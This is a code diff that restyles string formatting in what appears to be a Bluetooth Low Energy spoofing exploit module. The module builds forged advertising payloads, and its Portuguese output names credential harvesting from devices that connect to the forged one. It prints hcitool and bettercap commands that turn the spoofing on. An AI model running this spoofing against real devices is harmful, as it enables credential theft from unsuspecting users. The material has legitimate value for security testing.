@@ -167,8 +167,8 @@ class Exploit(Exploit):
             tx_power=int(self.tx_power),
         )
 
-        print_success("Advertising payload: {} bytes".format(len(ad_payload)))
-        print_info("AD payload hex: {}".format(ad_payload.hex()))
+        print_success(f"Advertising payload: {len(ad_payload)} bytes")
+        print_info(f"AD payload hex: {ad_payload.hex()}")
 
         interval_units = max(int(self.adv_interval) * 1000 // 625, 0x0020)
         params_cmd = _build_hci_le_set_adv_params(interval_units, interval_units + 0x0010)
@@ -202,7 +202,7 @@ class Exploit(Exploit):
             ad_type = ad_payload[offset + 1]
             ad_data = ad_payload[offset + 2:offset + 1 + ad_len]
             ad_rows.append((
-                "0x{:02X}".format(ad_type),
+                f"0x{ad_type:02X}",
                 type_names.get(ad_type, "Unknown"),
                 str(len(ad_data)),
                 ad_data.hex(),
@@ -210,15 +210,12 @@ class Exploit(Exploit):
             offset += 1 + ad_len
         print_table(ad_headers, *ad_rows, title="AD Structures")
 
-        print_warning("Dispositivo forjado aparecerá como '{}' para scanners BLE".format(
-            self.device_name
-        ))
+        print_warning(f"Dispositivo forjado aparecerá como '{self.device_name}' para scanners BLE")
         print_info("Impacto: centrais podem se conectar ao dispositivo forjado para coleta de credenciais")
         print_info("")
         print_info("Para ativar o spoofing:")
         print_info("  sudo hcitool -i {} cmd 0x08 0x0006 {} {} ...".format(
             self.interface, "A0 00", "C0 00"))
-        print_info("  sudo hcitool -i {} cmd 0x08 0x0008 {}...".format(
-            self.interface, len(ad_payload)))
+        print_info(f"  sudo hcitool -i {self.interface} cmd 0x08 0x0008 {len(ad_payload)}...")
         print_info("  Ou usar: bettercap ble.recon; ble.spoof {} {}".format(
             self.target or "TARGET", self.device_name))
